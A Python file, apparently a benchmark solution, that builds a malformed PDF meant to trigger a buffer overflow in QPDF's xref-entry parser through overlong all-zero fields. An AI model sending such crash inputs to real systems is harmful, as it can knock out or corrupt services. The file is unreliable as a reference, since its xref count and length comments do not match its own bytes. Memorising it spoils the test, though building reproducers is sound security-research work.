import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is in QPDF::read_xrefEntry where overlong
        # f1 or f2 entries consisting only of zeros cause buffer overflow.
        # Ground-truth length is 48 bytes.
        # We need to create a PDF with a malformed xref entry.
        
        # Minimal PDF structure with malformed xref entry
        poc = (
            b"%PDF-1.0\n"                          # PDF header
            b"1 0 obj\n"                           # Object header
            b"<<\n"                                # Dictionary start
            b"/Type /Catalog\n"                    # Catalog type
            b"/Pages 2 0 R\n"                      # Reference to pages
            b">>\n"                                # Dictionary end
            b"endobj\n"                            # Object end
            
            b"2 0 obj\n"                           # Pages object
            b"<<\n"                                # Dictionary start
            b"/Type /Pages\n"                      # Pages type
            b"/Kids [3 0 R]\n"                     # Reference to page
            b"/Count 1\n"                          # Page count
            b">>\n"                                # Dictionary end
            b"endobj\n"                            # Object end
            
            b"3 0 obj\n"                           # Page object
            b"<<\n"                                # Dictionary start
            b"/Type /Page\n"                       # Page type
            b"/Parent 2 0 R\n"                     # Parent reference
            b"/MediaBox [0 0 612 792]\n"           # Media box
            b">>\n"                                # Dictionary end
            b"endobj\n"                            # Object end
            
            b"xref\n"                              # Xref section
            b"0 4\n"                               # 4 entries
            b"0000000000 65535 f \n"               # Free entry
            b"0000000017 00000 n \n"               # Object 1
            b"0000000060 00000 n \n"               # Object 2
            b"0000000103 00000 n \n"               # Object 3
            
            # Malformed entry - overlong f1/f2 fields with only zeros
            # This triggers the buffer overflow in read_xrefEntry
            b"0000000000000000000000000000000000000000 f \n"
            
            b"trailer\n"                           # Trailer section
            b"<<\n"                                # Dictionary start
            b"/Size 5\n"                           # Size includes malformed entry
            b"/Root 1 0 R\n"                       # Root reference
            b">>\n"                                # Dictionary end
            b"startxref\n"                         # Startxref
            b"146\n"                               # Offset to xref
            b"%%EOF\n"                             # EOF marker
        )
        
        return poc
